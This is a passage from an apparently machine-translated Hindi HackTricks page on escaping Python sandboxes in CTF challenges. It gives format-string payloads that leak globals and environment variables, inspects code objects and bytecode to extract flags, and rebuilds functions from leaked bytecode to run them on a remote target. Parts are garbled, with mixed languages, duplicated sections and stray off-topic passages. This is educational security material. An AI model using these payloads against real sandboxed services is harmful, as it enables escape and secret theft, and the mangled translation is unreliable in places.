Python आंतरिक ऑब्जेक्ट से संबंधित **संवेदनशील जानकारी पढ़ने** के लिए निम्नलिखित पृष्ठ की भी जांच करें:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### संवेदनशील जानकारी विफलता पेलोड्स
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Python ऑब्जेक्ट का विश्लेषण

{% hint style="info" %}
यदि आप **पायथन बाइटकोड** के बारे में गहराई से जानना चाहते हैं, तो इस विषय पर यह **शानदार** पोस्ट पढ़ें: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

कुछ CTFs में आपको एक **कस्टम फ़ंक्शन का नाम दिया जा सकता है जहां फ़्लैग** स्थित होता है और आपको उसके **आंतरिक** को देखने की आवश्यकता होती है ताकि आप इसे निकाल सकें।

यह है जिस फ़ंक्शन का निरीक्षण करना है:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### डायरेक्टरी

यह फ़ंक्शन एक डायरेक्टरी के सभी फ़ाइलों और फ़ोल्डरों की सूची देती है। यह फ़ंक्शन एक लिस्ट रिटर्न करती है, जिसमें डायरेक्टरी में मौजूद सभी आइटमों के नाम शामिल होते हैं।

उदाहरण:

```python
import os

def get_directory_contents(directory):
    return os.listdir(directory)

directory_contents = get_directory_contents('/path/to/directory')
print(directory_contents)
```

इस उदाहरण में, `get_directory_contents` फ़ंक्शन डायरेक्टरी के सभी आइटमों की सूची लेने के लिए `os.listdir` फ़ंक्शन का उपयोग करती है। फ़ंक्शन को डायरेक्टरी का पथ पास किया जाता है और यह एक लिस्ट रिटर्न करती है जिसमें डायरेक्टरी में मौजूद सभी आइटमों के नाम शामिल होते हैं। इस उदाहरण में, `directory_contents` चित्रण किया जाता है जो डायरेक्टरी में मौजूद सभी आइटमों की सूची है।
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### ग्लोबल्स

`__globals__` और `func_globals` (एक ही बात) ग्लोबल पर्यावरण प्राप्त करता है। उदाहरण में आप कुछ आयातित मॉड्यूल, कुछ ग्लोबल चर और उनकी घोषित सामग्री देख सकते हैं:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**यहां अधिक स्थान देखें जहां ग्लोबल प्राप्त किए जा सकते हैं**](./#globals-and-locals)

### **फंक्शन कोड तक पहुंच**

**`__code__`** और `func_code`: आप इस फंक्शन के इस **गुण** तक **पहुंच सकते हैं** ताकि आप फंक्शन के कोड ऑब्जेक्ट को **प्राप्त कर सकें**।
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### कोड सूचना प्राप्त करना

To bypass Python sandboxes, it is important to gather information about the code being executed. This information can help in understanding the restrictions imposed by the sandbox and finding ways to bypass them.

#### 1. Inspecting the Python version

The first step is to determine the version of Python being used in the sandbox. This can be done by executing the following code:

```python
import sys
print(sys.version)
```

The output will provide information about the Python version, which can be useful in identifying vulnerabilities or specific features that can be exploited.

#### 2. Enumerating available modules

Next, it is important to identify the modules that are available in the sandbox environment. This can be done by executing the following code:

```python
import pkgutil
import sys

for module in pkgutil.iter_modules():
    print(module.name)
```

The output will list all the available modules, which can be used to determine the functionality that can be leveraged for bypassing the sandbox.

#### 3. Checking for restricted built-in functions

Some sandboxes restrict the use of certain built-in functions. To check for such restrictions, the following code can be executed:

```python
import builtins

restricted_functions = []

for function in dir(builtins):
    try:
        eval(function)
    except:
        restricted_functions.append(function)

print(restricted_functions)
```

The output will provide a list of restricted built-in functions, which can help in identifying alternative methods or workarounds.

#### 4. Analyzing imported modules

It is also important to analyze the imported modules and their functions to identify any restrictions or vulnerabilities. This can be done by executing the following code:

```python
import module_name

print(dir(module_name))
```

Replace `module_name` with the name of the module you want to analyze. The output will list all the functions and attributes of the module, which can be useful in understanding its capabilities and limitations.

By gathering information about the code being executed in the sandbox, it becomes easier to identify potential vulnerabilities or bypass techniques. This knowledge can be used to craft effective exploits and bypass the restrictions imposed by the sandbox environment.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **एक फंक्शन को डिसअसेंबल करें**

To disassemble a function, you can use the `dis` module in Python. This module allows you to view the bytecode instructions of a function, which can be helpful in understanding its inner workings.

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

The `dis.dis()` function takes the function name as an argument and displays the bytecode instructions. Each instruction is represented by its opcode and any associated arguments.

एक फंक्शन को डिसअसेंबल करने के लिए, आप Python में `dis` मॉड्यूल का उपयोग कर सकते हैं। यह मॉड्यूल आपको एक फंक्शन के बाइटकोड निर्देशों को देखने की अनुमति देता है, जो उसके आंतरिक कामकाज को समझने में मददगार हो सकता है।

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

`dis.dis()` फंक्शन फंक्शन का नाम एक तर्क के रूप में लेता है और बाइटकोड निर्देशों को प्रदर्शित करता है। प्रत्येक निर्देश को उसके ऑपकोड और संबंधित तर्कों के द्वारा प्रतिष्ठित किया जाता है।
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
ध्यान दें कि यदि आप पायथन सैंडबॉक्स में `dis` को आयात नहीं कर सकते हैं, तो आप फ़ंक्शन (`get_flag.func_code.co_code`) के **बाइटकोड** को प्राप्त कर सकते हैं और इसे स्थानीय रूप में **डिसअसेंबल** कर सकते हैं। आप लोड हो रहे चरों की सामग्री (`LOAD_CONST`) नहीं देखेंगे, लेकिन आप (`get_flag.func_code.co_consts`) से उन्हें अनुमान लगा सकते हैं क्योंकि `LOAD_CONST` भी लोड हो रहे चर के ऑफसेट को बताता है।
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Python को कंपाइल करना

अब, चलो सोचें कि आप किसी ऐसे फंक्शन की जानकारी को **डंप कर सकते हैं जिसे आप नहीं चला सकते** लेकिन आपको इसे **चलाने की जरूरत है**।\
जैसे निम्नलिखित उदाहरण में, आप उस फंक्शन के **कोड ऑब्जेक्ट तक पहुंच सकते हैं**, लेकिन डिसअसेंबल को पढ़कर आपको पता नहीं चलेगा कि फ्लैग कैसे कैलकुलेट करेंगे (_एक अधिक संयोजित `calc_flag` फंक्शन की कल्पना करें_)।
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### कोड ऑब्जेक्ट बनाना

सबसे पहले, हमें यह जानना होगा कि **कोड ऑब्जेक्ट कैसे बनाएं और चलाएं** ताकि हम अपने लीक हुए फ़ंक्शन को चलाने के लिए एक ऑब्जेक्ट बना सकें:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
पायथन संस्करण के आधार पर `code_type` के **पैरामीटर** के **अनुक्रम** में अंतर हो सकता है। आप चला रहे पायथन संस्करण में पैरामीटरों के आदेश को जानने के लिए सबसे अच्छा तरीका है:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### एक लीक हुए फ़ंक्शन को पुनः बनाना

{% hint style="warning" %}
निम्नलिखित उदाहरण में, हम फ़ंक्शन कोड ऑब्जेक्ट से सीधे फ़ंक्शन को पुनः बनाने के लिए आवश्यक सभी डेटा को लेंगे। एक **वास्तविक उदाहरण** में, फ़ंक्शन **`code_type`** को निष्कासित करने के लिए आपको सभी **मान** की आवश्यकता होगी।
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### रक्षाओं को उम्मीदवार बनाएं

पिछले उदाहरणों में इस पोस्ट की शुरुआत में आप देख सकते हैं कि **`compile` फ़ंक्शन का उपयोग करके कैसे कोई भी पायथन कोड निष्पादित किया जा सकता है**। यह दिलचस्प है क्योंकि आप एक **एकल लाइनर** में लूप्स और सब कुछ के साथ **पूरे स्क्रिप्ट को निष्पादित** कर सकते हैं (और हम ऐसा ही कर सकते हैं **`exec`** का उपयोग करके)।\
फिर भी, कभी-कभी यह उपयोगी हो सकता है कि एक स्थानीय मशीन में एक **कंपाइल किया गया ऑब्जेक्ट** बनाया जाए और इसे **CTF मशीन** में निष्पादित किया जाए (उदाहरण के लिए क्योंकि हमारे पास CTF में `compiled` फ़ंक्शन नहीं है)।

उदाहरण के लिए, आइए हम _./poc.py_ को पढ़ने वाली एक फ़ंक्शन को मैन्युअल रूप से कंपाइल और निष्पादित करें:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
यदि आप `eval` या `exec` तक पहुंच नहीं पा रहे हैं, तो आप एक **उचित फ़ंक्शन** बना सकते हैं, लेकिन इसे सीधे कॉल करने पर आमतौर पर विफल होगा: _संक्षिप्त मोड में उपलब्ध नहीं हैंडलर_. इसलिए, आपको इस फ़ंक्शन को कॉल करने के लिए **प्रतिबंधित पर्यावरण में नहीं होने वाले एक फ़ंक्शन** की आवश्यकता होगी।
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## भाषांतरण किया गया विषय

## कंपाइल किए गए पायथन को डीकंपाइल करना

[**https://www.decompiler.com/**](https://www.decompiler.com) जैसे उपकरण का उपयोग करके दिए गए कंपाइल किए गए पायथन कोड को **डीकंपाइल** किया जा सकता है।

**इस ट्यूटोरियल की जांच करें**:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## मिस्क पायथन

### असर्ट

पैरामीटर `-O` के साथ अपशिष्टीकरण के साथ निष्पादित पायथन में असर्ट स्टेटमेंट को हटा देगा और **debug** के मान पर शर्त लगाने वाले कोड को हटा देगा।\
इसलिए, निम्नलिखित जांचें जैसे
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## संदर्भ

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता जो मायने रखती हैं उनमें से विकर्षण करें ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमला सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे मुफ्त में प्रयास करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की सुविधा** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा पीआर जमा करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
